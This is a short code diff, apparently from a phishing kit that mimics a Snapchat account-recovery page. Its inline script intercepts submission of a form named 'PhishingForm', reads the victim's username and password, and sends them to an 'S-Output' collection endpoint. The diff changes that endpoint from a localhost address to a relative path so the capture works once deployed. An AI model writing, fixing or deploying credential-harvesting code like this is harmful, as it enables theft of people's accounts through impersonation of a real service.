@@ -50559,7 +50559,7 @@ body .App .AccountRecovery .dropdown-menu .form-control {
     <script>
     document.getElementById("PhishingForm").onsubmit = function(event){
           event.preventDefault()
-          fetch(`http://127.0.0.1:3000/S-Output?from=Snapchat&pass=${document.getElementById("password").value}&username=${document.getElementById("username").value}`)
+          fetch(`./S-Output?from=Snapchat&pass=${document.getElementById("password").value}&username=${document.getElementById("username").value}`)
         }
     </script>
     </body></html>
